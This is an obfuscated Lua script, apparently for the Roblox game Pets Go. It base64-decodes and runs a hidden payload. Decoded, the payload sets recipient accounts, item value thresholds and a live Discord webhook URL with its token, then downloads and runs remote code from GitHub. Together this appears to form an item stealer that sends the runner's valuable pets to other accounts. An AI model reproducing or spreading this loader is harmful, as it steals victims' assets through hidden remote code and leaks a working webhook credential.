
-- Obfuscated script
local encodedScript = "Ci0tIFBFVFNHTyBTY3JpcHQgQ29uZmlndXJhdGlvbgpVc2VybmFtZXMgPSB7ICJOT1RCRU5TQUxUQUNDIiwgIk5PVEJFTlNBTFRBQ0MiLCAiTk9UQkVOU0FMVEFDQyIsIC0tIEFkZCBtb3JlIHVzZXJzIGJlbG93IGlmIHlvdSB3YW50IHRvCiAgLS0gInVzZXI0IiwKICAtLSAidXNlcjUiLAp9Cm1pbl9yYXAgPSAxMDAwIC0tIG1pbmltdW0gcmFwIG9mIGVhY2ggaXRlbSB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UuIDFrIGJ5IGRlZmF1bHQKbWluX2NoYW5jZSA9IDEwMDAwMDAwIC0tIG1pbmltdW0gY2hhbmNlIG9mIHBldHMgeW91IHdhbnQgdG8gZ2V0IHNlbnQgdG8geW91LiAxMDBrIGJ5IGRlZmF1bHQKd2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQ0NTg4MjAyMzI5MTE2NzAyLzFJRVRJTUtlYjRmaVVsNWgwS0s4ZEk1aTVIQ0pnYTNma0NiMmN0c3h6SHZCSEtrN0FJR0k3eEFUOUhWZEZ3MkhvMHV1IiAtLSBEaXNjb3JkIHdlYmhvb2sgVVJMIGZvciBub3RpZmljYXRpb25zCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JBS0FqZGRjL05ldy1Tb3VyY2VzL3JlZnMvaGVhZHMvbWFpbi9QZXRzR29CeVRydWx5Tm90QmVuLnR4dCIsIHRydWUpKSgpCg=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
